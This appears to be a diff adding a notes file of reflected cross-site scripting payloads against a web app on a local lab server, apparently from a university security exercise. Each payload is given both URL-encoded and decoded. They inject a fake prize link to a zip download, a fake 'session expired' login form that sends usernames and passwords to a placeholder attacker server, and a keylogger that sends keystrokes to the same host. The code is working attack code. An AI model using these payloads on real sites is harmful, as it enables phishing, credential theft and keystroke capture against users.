@@ -1,0 +1,115 @@
+
+###########
+### RAW ###
+###########
+
+// 1
+http://192.168.x.3:8090/search?term=%3Cscript%3E%24%28%27.js-search__results%27%29.empty%28%29.append%28%27%3Ch3+style%3D%22text-align%3Acenter%3B%22%3E%3Cb%3ECongratulations%21+%3C%2Fb%3EYou+are+our+1000th+visitor%21+Click+%3Ca+href%3D%22http%3A%2F%2Frti.etf.bg.ac.rs%2Frti%2Fir4zp%2Flaboratorija%2FCOALA.zip%22%3Ehere%3C%2Fa%3E+to+claim+a+special+price%21%3C%2Fh3%3E%27%29%3B%24%28%27.js-search__inputfield%27%29.val%28%27%27%29%3B%3C%2Fscript%3E
+
+
+// 2
+http://192.168.x.3:8090/register?errorUsername&registerUsername=+%22%2F%3E%3Cscript%3E+var+keys+%3D+%5B%5D%3B+window.addEventListener%28%22keydown%22%2C+function%28ev%29%7B+var+today+%3D+new+Date%28%29%3B+var+date+%3D+today.getFullYear%28%29%2B%27-%27%2B%28today.getMonth%28%29%2B1%29%2B%27-%27%2Btoday.getDate%28%29%3B+var+time+%3D+today.getHours%28%29+%2B+%22%3A%22+%2B+today.getMinutes%28%29+%2B+%22%3A%22+%2B+today.getSeconds%28%29%3B+var+dateTime+%3D+date%2B%27+%27%2Btime%3B+keys.push%28%7B+t%3A+dateTime%2C+k%3A+ev.key+%7D%29%3B+%7D%29%3B+window.setInterval%28function+%28%29+%7B+if+%28keys.length%3E5%29+%7B+var+data+%3D+encodeURIComponent%28JSON.stringify%28keys%29%29%3B+new+Image%28%29.src+%3D+%22http%3A%2F%2Fadresa_napada%C4%8Devog_servera%3A3000%2FgetKeys%3Fkeys%3D%22+%2B+data%3B+keys+%3D+%5B%5D%3B+%7D+%7D%2C+500%29%3B+%3C%2Fscript%3E
+
+
+// 3
+console.log(decodeURIComponent("http://192.168.x.3:8090/search?term=%3Cscript%3Efunction+getname%28%29+%7Bvar+u+%3D+%24%28%27%23username%27%29.val%28%29%3B+var+p+%3D+%24%28%27%23password%27%29.val%28%29%3B+document.location%3D%22http%3A%2F%2Fadresa_napada%C4%8Devog_servera%3A3000%2FgetCredentials%3Fusername%3D%22%2Bu%2B%22%26password%3D%22%2Bp%3B%7D+%24%28%27.js-search%27%29.empty%28%29.append%28%27%3Ch2%3EYour+session+expired%2C+please+log+in+again.%3C%2Fh2%3E%3Cdiv+class%3D%22access%22%3E%3Cdiv+class%3D%22login%22%3E%3Cdiv+class%3D%22login__username+js-login__username%22%3E%3Clabel+for%3D%22username%22%3EUsername%3A%3C%2Flabel%3E%3Cinput+type%3D%22text%22+id%3D%22username%22+name%3D%22username%22%2F%3E%3C%2Fdiv%3E%3Cdiv+class%3D%22login__password+jslogin__password%22%3E%3Clabel+for%3D%22password%22%3EPassword%3A%3C%2Flabel%3E%3Cinput+type%3D%22password%22+id%3D%22password%22+name%3D%22password%22%2F%3E%3C%2Fdiv%3E%3Cbutton+type%3D%22button%22+onclick%3D%22getname%28%29%22%3ELog+in%3C%2Fbutton%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%27%29%3B%3C%2Fscript%3E"))
+
+
+
+
+
+-------------------------------------------------------------------------------
+
+#########
+### 1 ###
+#########
+
+console.log(decodeURIComponent("%3Cscript%3E%24%28%27.js-search__results%27%29.empty%28%29.append%28%27%3Ch3+style%3D%22text-align%3Acenter%3B%22%3E%3Cb%3ECongratulations%21+%3C%2Fb%3EYou+are+our+1000th+visitor%21+Click+%3Ca+href%3D%22http%3A%2F%2Frti.etf.bg.ac.rs%2Frti%2Fir4zp%2Flaboratorija%2FCOALA.zip%22%3Ehere%3C%2Fa%3E+to+claim+a+special+price%21%3C%2Fh3%3E%27%29%3B%24%28%27.js-search__inputfield%27%29.val%28%27%27%29%3B%3C%2Fscript%3E"))
+
+// Fake prize scam script - DO NOT INTERACT WITH THIS
+$('.js-search__results').empty().append(
+    '<h3 style="text-align:center;">' +
+        '<b>Congratulations! </b>' +
+        'You are our 1000th visitor! Click ' +
+        '<a href="http://rti.etf.bg.ac.rs/rti/ir4zp/laboratorija/COALA.zip">here</a> ' +
+        'to claim a special price!' +
+    '</h3>'
+);
+
+$('.js-search__inputfield').val('');
+
+
+
+
+-------------------------------------------------------------------------------
+
+
+#########
+### 2 ###
+#########
+
+console.log(decodeURIComponent("http://192.168.x.3:8090/search?term=%3Cscript%3Efunction+getname%28%29+%7Bvar+u+%3D+%24%28%27%23username%27%29.val%28%29%3B+var+p+%3D+%24%28%27%23password%27%29.val%28%29%3B+document.location%3D%22http%3A%2F%2Fadresa_napada%C4%8Devog_servera%3A3000%2FgetCredentials%3Fusername%3D%22%2Bu%2B%22%26password%3D%22%2Bp%3B%7D+%24%28%27.js-search%27%29.empty%28%29.append%28%27%3Ch2%3EYour+session+expired%2C+please+log+in+again.%3C%2Fh2%3E%3Cdiv+class%3D%22access%22%3E%3Cdiv+class%3D%22login%22%3E%3Cdiv+class%3D%22login__username+js-login__username%22%3E%3Clabel+for%3D%22username%22%3EUsername%3A%3C%2Flabel%3E%3Cinput+type%3D%22text%22+id%3D%22username%22+name%3D%22username%22%2F%3E%3C%2Fdiv%3E%3Cdiv+class%3D%22login__password+jslogin__password%22%3E%3Clabel+for%3D%22password%22%3EPassword%3A%3C%2Flabel%3E%3Cinput+type%3D%22password%22+id%3D%22password%22+name%3D%22password%22%2F%3E%3C%2Fdiv%3E%3Cbutton+type%3D%22button%22+onclick%3D%22getname%28%29%22%3ELog+in%3C%2Fbutton%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%27%29%3B%3C%2Fscript%3E"))
+
+// Phishing page script - DO NOT RUN THIS
+function getname() {
+    var u = $('#username').val();
+    var p = $('#password').val();
+    
+    document.location = "http://adresa_napadačevog_servera:3000/getCredentials?username=" + u + "&password=" + p;
+}
+
+$('.js-search').empty().append('<h2>Your session expired, please log in again.</h2>' +
+    '<div class="access">' +
+        '<div class="login">' +
+            '<div class="login__username js-login__username">' +
+                '<label for="username">Username:</label>' +
+                '<input type="text" id="username" name="username" />' +
+            '</div>' +
+            '<div class="login__password jslogin__password">' +
+                '<label for="password">Password:</label>' +
+                '<input type="password" id="password" name="password" />' +
+            '</div>' +
+            '<button type="button" onclick="getname()">Log in</button>' +
+        '</div>' +
+    '</div>'
+);
+
+
+
+
+-------------------------------------------------------------------------------
+
+
+#########
+### 3 ###
+#########
+
+console.log(decodeURIComponent("http://192.168.x.3:8090/register?errorUsername&registerUsername=+%22%2F%3E%3Cscript%3E+var+keys+%3D+%5B%5D%3B+window.addEventListener%28%22keydown%22%2C+function%28ev%29%7B+var+today+%3D+new+Date%28%29%3B+var+date+%3D+today.getFullYear%28%29%2B%27-%27%2B%28today.getMonth%28%29%2B1%29%2B%27-%27%2Btoday.getDate%28%29%3B+var+time+%3D+today.getHours%28%29+%2B+%22%3A%22+%2B+today.getMinutes%28%29+%2B+%22%3A%22+%2B+today.getSeconds%28%29%3B+var+dateTime+%3D+date%2B%27+%27%2Btime%3B+keys.push%28%7B+t%3A+dateTime%2C+k%3A+ev.key+%7D%29%3B+%7D%29%3B+window.setInterval%28function+%28%29+%7B+if+%28keys.length%3E5%29+%7B+var+data+%3D+encodeURIComponent%28JSON.stringify%28keys%29%29%3B+new+Image%28%29.src+%3D+%22http%3A%2F%2Fadresa_napada%C4%8Devog_servera%3A3000%2FgetKeys%3Fkeys%3D%22+%2B+data%3B+keys+%3D+%5B%5D%3B+%7D+%7D%2C+500%29%3B+%3C%2Fscript%3E"))
+
+
+
+http://192.168.x.3:8090/register?errorUsername&registerUsername=+"/><script>+var+keys+=+[];+window.addEventListener("keydown",+function(ev){+var+today+=+new+Date();+var+date+=+today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();+var+time+=+today.getHours()+++":"+++today.getMinutes()+++":"+++today.getSeconds();+var+dateTime+=+date+'+'+time;+keys.push({+t:+dateTime,+k:+ev.key+});+});+window.setInterval(function+()+{+if+(keys.length>5)+{+var+data+=+encodeURIComponent(JSON.stringify(keys));+new+Image().src+=+"http://adresa_napadačevog_servera:3000/getKeys?keys="+++data;+keys+=+[];+}+},+500);+</script>
+
+
+// Keylogger script - DO NOT RUN THIS
+var keys = [];
+
+window.addEventListener("keydown", function(ev) {
+    var today = new Date();
+    var date = today.getFullYear() + '-' + (today.getMonth() + 1) + '-' + today.getDate();
+    var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
+    var dateTime = date + ' ' + time;
+    
+    keys.push({
+        t: dateTime,
+        k: ev.key
+    });
+});
+
+window.setInterval(function() {
+    if (keys.length > 5) {
+        var data = encodeURIComponent(JSON.stringify(keys));
+        new Image().src = "http://adresa_napadačevog_servera:3000/getKeys?keys=" + data;
+        keys = [];
+    }
+}, 500);
